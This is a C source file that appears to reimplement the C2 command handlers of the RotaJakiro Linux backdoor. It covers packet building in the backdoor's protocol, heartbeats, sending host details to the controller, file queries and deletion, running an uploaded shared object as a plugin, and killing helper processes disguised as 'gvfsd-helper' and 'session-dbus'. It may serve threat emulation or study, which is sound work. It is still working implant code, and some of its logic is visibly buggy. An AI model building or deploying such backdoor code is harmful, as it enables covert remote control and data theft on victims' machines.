#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <signal.h>
#include <sys/shm.h>
#include <sys/stat.h>

#include "c2_commands.h"
#include "c2_loop.h"


// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85

unsigned char payloadLen[] = {0x0f};
unsigned char keyLen[] = {0x00,0x00};
unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};

void c2_exit(char *cmd_id, int sock) {

    char *msg  = "exiting!";
    build_c2_response(msg, strlen(msg), cmd_id, sock);
    shutdown(sock, 2);
    close(sock);

    // get pids from sharedmem and kill both pids
    int shmid = shmget(0x64b2e2, 0, 0666);

    // if handled on sharedmem cannot be obtained
    if (shmid == -1) {
        #ifdef DEBUG
        printf("shmget could not find shared mem. Quitting!");
        #endif
        exit(0);
    }


    int *shmem_pid_addr = (int *)shmat(shmid, NULL, 0);
    int *gvfsd_pid = (int *)malloc(4);
    int *sessiondbus_pid = (int *)malloc(4);

    // Get gvfsd-helper pid from sharedmem  and kill it
    memset(gvfsd_pid, 0, 4);
    memcpy(gvfsd_pid, shmem_pid_addr, 4);
    kill(*gvfsd_pid, SIGKILL);

    // Get session-dbus pid from sharedmem and kill it
    memset(sessiondbus_pid, 0, 4);
    memcpy(sessiondbus_pid, shmem_pid_addr+4, 4);
    #ifdef DEBUG
    printf("Killing %d\n", *sessiondbus_pid);
    #endif
    // REALLY need to kill this...
    kill(*sessiondbus_pid, SIGKILL);

    shmctl(shmid, IPC_RMID, NULL);
    #ifdef DEBUG
    printf("Deleting shared memory ID\n");
    #endif

    // we won't reach this...
    free(sessiondbus_pid);
    free(gvfsd_pid);
    exit(0);
}


void c2_heartbeat(char *cmd_id, int sock) {
    #ifdef DEBUG
    printf("[+] Rota C2 heartbeat!\n");
    #endif
    char *buffer = "PING";
    build_c2_response(buffer, strlen(buffer), cmd_id, sock);
}

void c2_set_timeout(int *sleepTime, int newTime) {
    *sleepTime = newTime;
}


void c2_upload_device_info(char *buffer) {
    // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...

    // ptr is null
    if (!buffer){
        #ifdef DEBUG
        fprintf(stderr, "[get_uname] error allocating data");
        #endif
    }

    struct utsname hostinfo;
    memset(buffer, 0, 0);

    int res  = uname(&hostinfo);
    if (res != 0) {
        strncpy(buffer,
                "unknown-platform",
                17);
    }

    snprintf(buffer, 200, "%s-%s-%s",
             hostinfo.nodename,
             hostinfo.sysname,
             hostinfo.release);
}


bool c2_query_file(char *fpath) {

    // F_OK == existence test
    if ((access(fpath, F_OK)) == 0) {

        return true;
    }

    return false;
}


bool c2_delete_file(char *fpath) {

    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        int res = unlink(fpath);
        if (res == 0) {
            return true;
        } else {
            // non-zero return value indicating something went wrong deleting a file.
            return false;
        }
    }

    return false;
}


void c2_run_plugin_1(char *funcName) {

    // SO expected to be uploaded via rota_c2_upload_file
    char *soPath = "./local_rota_file.so";
    void *handle = dlopen(soPath, RTLD_LAZY);
    void (*func_ptr)() = dlsym(handle, funcName);
    // execution of shared object
    func_ptr();
    dlclose(handle);
}


char *initial_rota_pkt() {

    char *rotaHdr = (char *)malloc(82);
    if (rotaHdr == NULL) {
        #ifdef DEBUG
        fprintf(stderr,"could not allocate data for rota header packet! Exiting!");
        exit(1);
        #endif
    }

    memset(rotaHdr, 0, 82);

    // 0-> 4 == magicbytes
    memcpy(rotaHdr, magicBytes, sizeof(magicBytes));

    // bytes 4->8 session id
    memcpy(&rotaHdr[4], sessionId, sizeof(sessionId));

    // payload length 8->11
    memcpy(&rotaHdr[8], payloadLen, sizeof(payloadLen));

    // byte 12 and 13  == key length
    memcpy(&rotaHdr[12], keyLen, sizeof(keyLen));

    // 14th -> 18th command id
    memcpy(&rotaHdr[14], initialBytes, sizeof(cmd_id));

    memcpy(&rotaHdr[19], marker_1, sizeof(marker_1));
    memcpy(&rotaHdr[24], marker_2, sizeof(marker_2));
    memcpy(&rotaHdr[29], marker_3, sizeof(marker_3));
    memcpy(&rotaHdr[75], marker_4, sizeof(marker_4));

    return rotaHdr;
}

char *parse_c2_cmdid(char *buffer) {
    char *cmd_id  = (char *)malloc(4);
    memset(cmd_id, 0, 4);
    memcpy(cmd_id, &buffer[14], 4);
    return cmd_id;
}

int parse_c2_payload_len(char *buffer) {

    int len;
    // convert char to integer
    memcpy(&len, &buffer[8], sizeof(int));
    return len;
}

char *parse_c2_payload( char *buffer, int length) {

    char *payload = (char *)malloc(length);
    if (!payload){
        #ifdef DEBUG
        fprintf(stderr, "error allocating data in parse_c2_pkt");
        #endif
        payload = "error allocating data";
        return payload;
    }
    memset(payload, 0, length);
    // copy last N-bytes from rota payload
    payload[length] = '\0';
    memcpy(payload, &buffer[82], length);
    return payload;
}


void build_c2_response(char *buffer, int buffer_size, char *cmd_id, int sock){
    char *rota_resp_pkt = initial_rota_pkt();

    // correct length of payload on buffer
    int buffer_len = buffer_size;

    // bytes 4->8 session id
    memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));

    memcpy(&rota_resp_pkt[8], &buffer_len, 4);

    // update cmd_id in response packet
    memcpy(&rota_resp_pkt[14], cmd_id, 4);
    // update cmd_id in response packet
    memcpy(&rota_resp_pkt[19], marker_1, sizeof(marker_1));

    // reallocate space from 82 byte header + response "body"
    rota_resp_pkt = realloc(rota_resp_pkt, (82 + buffer_len));
    // zero out new realloc'd data
    memset(&rota_resp_pkt[82], 0, strlen(buffer));
    memcpy(&rota_resp_pkt[82], buffer, buffer_len);

    send(sock, rota_resp_pkt, (82 + buffer_len), 0);
    free(rota_resp_pkt);
    close(sock);
}
